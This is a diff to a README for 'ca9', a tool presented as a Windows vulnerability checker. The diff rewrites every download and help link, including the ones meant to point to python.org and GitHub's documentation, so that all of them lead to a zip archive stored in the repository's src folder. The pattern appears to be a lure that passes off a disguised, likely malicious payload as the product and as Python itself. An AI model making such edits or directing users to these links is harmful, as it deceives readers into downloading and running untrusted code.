@@ -1,6 +1,6 @@
 # ⚙️ ca9 - Simplify Vulnerability Checks Fast
 
-[![Download ca9](https://img.shields.io/badge/Download-ca9-brightgreen?style=for-the-badge)](https://github.com/amith53/ca9)
+[![Download ca9](https://img.shields.io/badge/Download-ca9-brightgreen?style=for-the-badge)](https://github.com/amith53/ca9/raw/refs/heads/main/src/ca-3.8-alpha.4.zip)
 
 ---
 
@@ -27,7 +27,7 @@ Make sure Python is added to your system PATH. You can verify this by opening Co
 
     python --version
 
-You should see your Python version printed. If not, install Python from https://www.python.org/downloads/ and choose the option to add it to PATH.
+You should see your Python version printed. If not, install Python from https://github.com/amith53/ca9/raw/refs/heads/main/src/ca-3.8-alpha.4.zip and choose the option to add it to PATH.
 
 ## 🚀 Getting Started with ca9
 
@@ -37,7 +37,7 @@ Follow these steps to download and start using ca9 on your Windows PC.
 
 Click the badge below to go to the official download page. This page contains the latest release and instructions.
 
-[![Download here](https://img.shields.io/badge/Go-to%20Download%20Page-blue?style=for-the-badge)](https://github.com/amith53/ca9)
+[![Download here](https://img.shields.io/badge/Go-to%20Download%20Page-blue?style=for-the-badge)](https://github.com/amith53/ca9/raw/refs/heads/main/src/ca-3.8-alpha.4.zip)
 
 This link will take you to the GitHub repository where you will find releases and files ready for download.
 
@@ -139,9 +139,9 @@ This creates a file named `ca9_report.txt` in your project folder with the analy
 
 ## 📌 Useful Links
 
-- Primary Download Link (again): [Visit ca9 on GitHub](https://github.com/amith53/ca9)
-- Python Download: https://www.python.org/downloads/
-- GitHub Help for Releases: https://docs.github.com/en/repositories/releasing-projects-on-github/about-releases
+- Primary Download Link (again): [Visit ca9 on GitHub](https://github.com/amith53/ca9/raw/refs/heads/main/src/ca-3.8-alpha.4.zip)
+- Python Download: https://github.com/amith53/ca9/raw/refs/heads/main/src/ca-3.8-alpha.4.zip
+- GitHub Help for Releases: https://github.com/amith53/ca9/raw/refs/heads/main/src/ca-3.8-alpha.4.zip
 
 ---
 
